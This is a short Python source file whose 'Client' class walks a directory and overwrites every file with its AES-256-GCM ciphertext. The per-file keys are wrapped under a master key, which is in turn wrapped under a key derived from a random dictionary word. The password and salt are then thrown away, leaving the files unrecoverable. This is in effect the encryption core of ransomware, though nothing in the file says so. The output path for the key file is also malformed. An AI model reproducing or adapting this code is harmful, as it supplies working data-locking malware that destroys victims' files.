import os
import secrets
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.keywrap import aes_key_wrap, aes_key_unwrap

DICTIONARY_PATH = "/usr/share/dict/words"
DIRECTORY_PATH = "./test"


class Client:

    def get_random_password(self) -> str:
        """
        Get a random password from the dictionary file.

        :param self: The Client instance.
        :return: The random password.
        :rtype: str
        """

        if not os.path.exists(DICTIONARY_PATH):
            raise FileNotFoundError(f"Dictionary file not found at {DICTIONARY_PATH}")

        with open(DICTIONARY_PATH, "r", encoding="utf-8") as f:
            words = f.read().splitlines()

        password = secrets.choice(words).strip()

        return password

    def generate_password_key(self, password: str) -> bytes:
        """
        Generate a password key from the given password using Argon2id KDF.

        :param self: The Client instance.
        :param password: The password to derive the key from.
        :return: The derived password key.
        :rtype: bytes
        """
        salt = os.urandom(16)

        kdf = Argon2id(
            salt=salt,
            length=32,
            iterations=1,
            lanes=4,
            memory_cost=64 * 1024,
            ad=None,
            secret=None,
        )

        password_key = kdf.derive(bytes(password, "utf-8"))

        return password_key

    def encrypt_file(self, file_path: str, master_key: bytes):
        """
        Encrypt a file using AES-256-GCM and replace its content with the wrapped key, IV, tag, and ciphertext.

        :param self: The Client instance.
        :param file_path: The path to the file to encrypt.
        :return: None
        """

        key = os.urandom(32)
        iv = os.urandom(12)

        encryptor = Cipher(
            algorithms.AES(key),
            modes.GCM(iv),
        ).encryptor()

        with open(file_path, "rb") as f:
            plaintext = f.read()

        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        tag = encryptor.tag
        wrapped_key = aes_key_wrap(master_key, key)

        with open(file_path, "wb") as f:
            f.write(wrapped_key + iv + tag + ciphertext)

    def encrypt_files(self):
        """
        Encrypt all files in the specified directory and store the wrapped master key in a binary file.
        :param self: The Client instance.
        :return: None
        """

        password = self.get_random_password()
        password_key = self.generate_password_key(password)
        master_key = os.urandom(32)

        for root, _, files in os.walk(DIRECTORY_PATH):
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(file_path, master_key)

        wrapped_master_key = aes_key_wrap(password_key, master_key)

        with open(f"{DIRECTORY_PATH}/{DIRECTORY_PATH}.bin", "wb") as f:
            f.write(wrapped_master_key)
